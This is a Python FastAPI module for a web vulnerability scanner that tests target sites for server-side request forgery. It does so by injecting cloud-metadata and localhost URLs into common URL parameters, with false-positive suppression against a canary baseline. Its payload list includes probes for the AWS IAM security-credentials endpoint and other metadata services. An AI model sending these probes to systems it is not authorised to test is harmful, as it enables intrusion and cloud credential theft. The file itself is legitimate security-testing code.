"""SSRF — cloud-metadata + localhost markers with SPA-baseline FP suppression."""
import hashlib
import re
import secrets
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_get, wrap_finding, standard_response)
router = APIRouter()

_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/",
     r"ami-id|instance-id|local-ipv4|public-keys/", "AWS IMDS"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     r"AccessKeyId|SecretAccessKey|SessionToken", "AWS IAM creds"),
    ("http://metadata.google.internal/computeMetadata/v1/",
     r"compute-engine|service-accounts/default", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     r"\"vmId\"|\"resourceGroupName\"", "Azure metadata"),
    ("http://169.254.169.254/metadata/v1/",
     r"\"droplet_id\"|\"interfaces\"", "DigitalOcean metadata"),
    # Localhost probes use a STRICT marker only valid for real localhost servers,
    # NOT generic HTML. Without a SPA-baseline match they cannot fire on Angular/
    # React/Vue apps that 200-on-everything.
    ("http://localhost/",
     r"It works!|Welcome to nginx|Apache.*Server.*at.*localhost|<title>Index of /",
     "localhost reachable"),
    ("http://127.0.0.1/",
     r"It works!|Welcome to nginx|Apache.*Server.*at.*127\.0\.0\.1|<title>Index of /",
     "127.0.0.1 reachable"),
]
_COMMON_KEYS = ["url","uri","src","fetch","image","img","avatar","callback",
                "redirect","webhook","proxy","host"]


def _resp_fingerprint(r):
    """Hash status + first 2KB of body so we can compare baseline vs probe."""
    if r is None:
        return None
    body = (r.text or "")[:2000]
    h = hashlib.md5(body.encode("utf-8", errors="ignore")).hexdigest()
    return f"{r.status_code}:{len(r.content)}:{h}"


@router.post("/api/scan/ssrf")
async def scan_ssrf(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target)
    parsed = urlparse(base)
    existing = parse_qs(parsed.query)
    candidates = set(existing.keys()) | set(_COMMON_KEYS)
    if not candidates:
        return standard_response(tool="ssrf", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason="No URL parameters — append ?url=http://... to test")

    findings, tests, confirmed, suppressed = [], 0, [], []

    # ── Per-param SPA baseline: send a benign value and fingerprint the response.
    # If a real SSRF payload returns the IDENTICAL fingerprint, the site is
    # ignoring the param (typical SPA behaviour). We suppress those findings.
    baselines = {}
    canary_token = "vlcanary" + secrets.token_hex(4)
    for key in candidates:
        new_params = {k: v[0] for k, v in existing.items()}
        new_params[key] = f"https://benign-{canary_token}.example/"
        canary_url = urlunparse(parsed._replace(query=urlencode(new_params)))
        cr = safe_get(canary_url, req=req, allow_redirects=False, timeout=10)
        baselines[key] = _resp_fingerprint(cr)

    for key in candidates:
        baseline_fp = baselines.get(key)
        for ssrf_url, marker, cloud in _PAYLOADS:
            tests += 1
            new_params = {k: v[0] for k, v in existing.items()}
            new_params[key] = ssrf_url
            test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
            extra = {"Metadata-Flavor": "Google"} if "metadata.google" in ssrf_url else {}
            r = safe_get(test_url, headers=extra, req=req, allow_redirects=False, timeout=10)
            if r is None or r.status_code != 200:
                continue
            # SPA-baseline gate — if response fingerprint matches the benign canary,
            # the site treats this param as a no-op (no SSRF).
            probe_fp = _resp_fingerprint(r)
            if baseline_fp is not None and probe_fp == baseline_fp:
                suppressed.append({"param": key, "cloud": cloud,
                                    "reason": "matches_spa_baseline"})
                continue
            try:
                if re.search(marker, (r.text or "")[:8000], re.IGNORECASE):
                    findings.append(wrap_finding(
                        f"SSRF — param {key!r} reaches {cloud}",
                        "CRITICAL", cvss="9.1", cwe="CWE-918", owasp="A10:2021",
                        remediation="Validate URLs against allow-list. Reject private IP ranges (10/8, 172.16/12, 192.168/16, 169.254/16, 127/8).",
                        evidence_marker=f"param={key} payload {ssrf_url!r} returned content matching {marker!r} ({cloud})"))
                    confirmed.append({"param": key, "payload": ssrf_url, "cloud": cloud})
                    break
            except re.error:
                continue

    return standard_response(tool="ssrf", target=req.target, findings=findings,
        tests_performed=tests,
        tests_summary=(f"SSRF: {tests} probes across {len(candidates)} params; "
                       f"SPA-baseline suppressed {len(suppressed)} FP(s); "
                       f"AWS/GCP/Azure/DO + localhost markers"),
        raw_data={"ssrf": {"confirmed": confirmed,
                            "suppressed_fps": suppressed,
                            "baseline_fingerprints": len([b for b in baselines.values() if b])}})


def register(app):
    app.include_router(router)
